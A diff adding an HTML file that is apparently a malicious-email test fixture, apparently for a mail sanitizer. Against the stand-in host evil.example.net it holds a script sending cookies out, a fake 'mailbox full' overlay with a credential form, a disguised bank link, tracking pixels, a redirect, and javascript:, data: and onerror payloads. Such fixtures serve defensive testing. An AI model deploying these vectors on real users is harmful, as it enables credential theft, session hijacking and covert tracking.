@@ -1,0 +1,30 @@
+<html>
+<head>
+<base href="https://evil.example.net/">
+<meta http-equiv="refresh" content="0; url=https://evil.example.net/phish">
+<link rel="stylesheet" href="https://evil.example.net/track.css?u=robin">
+<style>
+  .overlay { position:fixed; top:0; left:0; right:0; bottom:0; z-index:99999; background:#fff; }
+  body { background-image:url(https://evil.example.net/px.gif?u=robin); }
+  @import url("https://evil.example.net/more.css");
+</style>
+<script>document.location = "https://evil.example.net/?c=" + document.cookie;</script>
+</head>
+<body>
+<div class="overlay">Your mailbox is full. Sign in to keep receiving mail.</div>
+<form action="https://evil.example.net/collect" method="post">
+  <input type="email" name="u" value="robin@example.org">
+  <input type="password" name="p" placeholder="Password">
+  <button type="submit">Sign in</button>
+</form>
+<p>Dear customer, <a href="https://evil.example.net/x7" title="https://bank.example.org/">https://bank.example.org/verify</a></p>
+<p><a href="javascript:alert(1)">click</a> <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">open</a></p>
+<img src="https://evil.example.net/open.gif?u=robin" width="1" height="1" onerror="alert(1)">
+<img src="cid:logo123@bank.example.org" alt="Bank logo" width="120" height="40">
+<div style="background:url(https://evil.example.net/bg.gif?u=robin); width:10px; height:10px"></div>
+<iframe src="https://evil.example.net/frame" width="400" height="300"></iframe>
+<object data="https://evil.example.net/x.swf"></object>
+<svg width="10" height="10"><image href="https://evil.example.net/svg.gif"/></svg>
+<p style="position:absolute; top:-9999px">hidden keyword stuffing</p>
+</body>
+</html>
